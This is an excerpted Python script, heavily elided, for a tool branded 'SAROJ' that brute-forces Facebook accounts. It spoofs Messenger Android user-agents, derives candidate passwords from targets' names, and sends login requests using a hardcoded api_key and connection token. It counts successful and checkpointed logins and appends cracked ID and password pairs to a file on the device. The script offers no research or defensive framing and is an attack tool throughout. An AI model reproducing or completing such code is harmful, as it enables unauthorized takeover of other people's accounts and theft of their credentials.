...
from concurrent.futures import ThreadPoolExecutor as SAROJgod
from string import * 
...
try: 
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[saroj]')
...
try:
    ...
    print('\x1b[1;92m[✓] PLEASE WAIT CHECKING SAROJ UPDATE...')
...
def randBuildLSB():
    ...
    END = '[FBAN/Orca-Android;FBAV/196.0.0.41.95;FBBV/129523926;FBDM/{density=2.0,width=720,height=1426};FBLC/en_IN;FBRV/351749474;FBCR/Zong;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.orca;FBDV/Infinix X682C;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]'
...
def randBuildvsskj():
    ...
    return ua
#××××××××××(COLOR'S)××××××××××#
sys.stdout.write('\x1b]2; SAROJ\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'×')
        input(" PRESS ENTER TO BACK SAROJ GOD MENU ")
        exit()
#××××××××××(MAIN-MENU)××××××××××#
def SAROJ():   
    os.system('clear')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ SAROJ ] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': '[FBAN/Orca-Android;FBAV/196.0.0.41.95;FBBV/129523926;FBDM/{density=2.0,width=720,height=1426};FBLC/en_IN;FBRV/351749474;FBCR/Zong;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBPN/com.facebook.orca;FBDV/Infinix X682C;FBSV/10;FBOP/1;FBCA/arm64-v8a:armeabi-v7a:armeabi]',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    #  print(f"\r{A} [CHECK POINT] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/saroj_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ saroj ] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
